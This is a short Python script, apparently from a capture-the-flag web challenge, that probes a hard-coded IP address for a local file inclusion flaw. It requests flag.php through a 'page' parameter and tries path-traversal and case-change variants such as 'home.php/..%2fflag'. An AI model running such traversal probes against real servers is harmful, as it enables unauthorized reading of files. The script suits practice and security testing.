import urllib.request, urllib.parse

host = "164.92.126.208"
port = 5002

# Test flag.php directly
url = f"http://{host}:{port}/?page=flag.php"
try:
    req = urllib.request.Request(url)
    resp = urllib.request.urlopen(req, timeout=5)
    body = resp.read().decode("utf-8", errors="replace")
    print(f"flag.php: {resp.status} -> {body[:200]}")
except urllib.error.HTTPError as e:
    body = e.read().decode("utf-8", errors="replace")
    print(f"flag.php: {e.code}")
    if "Access Denied" in body:
        print("  Access Denied (filter blocked or file not found)")
    else:
        print("  Standard 404")

# Test more variations
tests = [
    "home.php/flag",
    "home.php/flag.php",
    "FLAG.php",
    "Flag.php",
    "home.PHP",
    "home.Php",
    "home.php/../flag",
    "home.php/..%2fflag",
    "home.php/..%2fflag.php",
]

for t in tests:
    try:
        q = urllib.parse.quote(t, safe="%/=")
        url2 = f"http://{host}:{port}/?page=" + q
        req = urllib.request.Request(url2)
        resp = urllib.request.urlopen(req, timeout=5)
        body = resp.read().decode("utf-8", errors="replace")
        if "Welcome, Seeker" not in body and len(body) < 500 and len(body) > 0:
            print(f"200: {t} -> {body[:200]}")
    except urllib.error.HTTPError:
        pass
    except Exception:
        pass

print("Done")
